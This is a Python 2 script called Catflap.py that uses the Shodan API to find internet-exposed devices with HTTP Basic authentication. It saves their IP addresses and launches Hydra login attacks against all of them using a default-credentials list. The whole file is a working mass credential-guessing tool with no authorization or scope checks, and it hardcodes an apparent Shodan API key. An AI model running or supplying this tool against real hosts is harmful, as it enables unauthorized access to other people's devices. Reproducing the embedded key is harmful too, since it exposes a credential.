#! /usr/bin/env python
#####################################
#        Catflap.py by @leonteale   #
#            Version 2.0            #
#          Default Pass login       #
#     Requirements: shodan, Hydra   #
#####################################
# Requirements:
# easy_install shodan
# apt-get install hydra

import sys
import os
import argparse
from subprocess import call
from shodan import WebAPI

SHODAN_API_KEY = "YaLNvFBVpaTrMkW829nATM3xRTvMaVsH"
# Get your API Key Here: "http://www.shodanhq.com/api_doc"

api = WebAPI(SHODAN_API_KEY)


# Prints title, version, contact info, etc.
def banner():
    title = "Catflap.py"
    version = "Version 2.0"
    contact = "leonteale89@gmail.com"
    print "-" * 45
    print title.center(45)
    print version.center(45)
    print contact.center(45)
    print "-" * 45

#Parse Arguments
parser = argparse.ArgumentParser(description="Using Shodan to search for mis-configured devices - (output file saved to output.txt)")
group = parser.add_mutually_exclusive_group()
group.add_argument("-v", "--verbose", action="store_true")
group.add_argument("-a", "--advanced", action="store_true", help="Show all result data")
group.add_argument("-i", "--ip", action="store_true", help="Show IPs result only")
parser.add_argument("search", help="Search keyword(s)")
group.add_argument("-s", "--simple", action="store_true", help="simple search")
group.add_argument("-r", "--hydra", action="store_true", help="Launches Hydra attack against first page of results")
args = parser.parse_args()

#Usage
def usage():
    print "You must supply an argument with your search\n"
    print "usage: Catflap.py [-h] [-v] [-a | -s] search\n"
    print "Example: Catflap.py \"default logins\" --simple\n"

def hydra():
    os.system("cp -a output.txt something.txt")
    os.system("hydra -C creds.txt -M something.txt http-get / > hydra.tmp")
    os.system("cat hydra.tmp | sort | grep host")

#Actual script
def core():
    
    ## Advanced Results
    if args.advanced:
        outputfile = open("output.txt", "wb")
        # Search Shodan
        results = api.search(sys.argv[1])

        # Show the results
        print "Results found for '%s': %s" % (sys.argv[1], results['total'])
        print ""
        for result in results['matches']:
            outputfile.write(result['ip'])
            outputfile.write("\n")
            outputfile.write(result['data'])
            outputfile.write("\n")
            print result['ip']
            print result['data']
        print '\nResults found: %s' % results['total']

    ## Verbose Output
    if args.verbose:
        outputfile = open("output.txt", "wb")
        # Search Shodan
        results = api.search(sys.argv[1])

        # Show the results
        print "Results found for '%s': %s" % (sys.argv[1], results['total'])
        print ""
        for result in results['matches']:
            outputfile.write(result['ip'])
            outputfile.write("\n")
            outputfile.write(result['data'])
            outputfile.write("\n")
            print 'IP: %s\n' % result['ip']
            print 'Data: %s\n' % result['data']

        print '\nResults found: %s' % results['total']

    ## Simple output
    if args.simple:
            outputfile = open("output.txt", "wb")
            # Search Shodan
            results = api.search(sys.argv[1])

            # Show the results
            print "Results found for '%s': %s" % (sys.argv[1], results['total'])
            print ""
            for result in results['matches']:
                if "Basic realm" in result['data']:
                    outputfile.write(result['ip'])
                    outputfile.write("\n")
                    outputfile.write(result['data'])
                    outputfile.write("\n")
                    print result['ip']
                    print result['data']
                else:
                    continue
            print '\nResults found: %s' % results['total']

    ## Return IPs only
    if args.ip:
        
        outputfile = open("output.txt", "wb")
        
        # Search Shodan
        results = api.search(sys.argv[1])

        # Show the results
        print "Results found for '%s': %s" % (sys.argv[1], results['total'])
        print ""
        for result in results['matches']:
            outputfile.write(result['ip'])
            outputfile.write("\n")
            print result['ip']
        print '\nResults found: %s \n' % results['total']
        
        ## Ask to run hydra attack against output.txt
        #confirm() 
    ## Runs hydra attack against output.txt
    if args.hydra:
        hydra()


#confirmation block
def confirm(prompt=None, resp=False):
    outputfile = open("output.txt", "wb")

    if prompt is None:
        prompt = 'Would you like to test these hosts with Hydra?'

    if resp:
        prompt = '%s %s|%s: ' % (prompt, 'Y', 'n')
    else:
        prompt = '%s %s|%s: ' % (prompt, 'N', 'y')
        
    while True:
        ans = raw_input(prompt)
        if not ans:
            print "you answered no"
            return resp
        if ans not in ['y', 'Y', 'n', 'N']:
            print 'please enter y or n.'
            continue
        if ans == 'y' or ans == 'Y':
            hydra()
            return True
        if ans == 'n' or ans == 'N':
            return False

def cleanup():
    os.system("rm hydra.tmp")
    os.system("rm something.txt")


#Ye old main
def main():
    banner()
    core()
    cleanup()

# Force usage
if __name__ == '__main__':
    if len(sys.argv) > 3 or len(sys.argv) < 3:
        banner()
        usage()
        sys.exit(1)
    else:
        main()
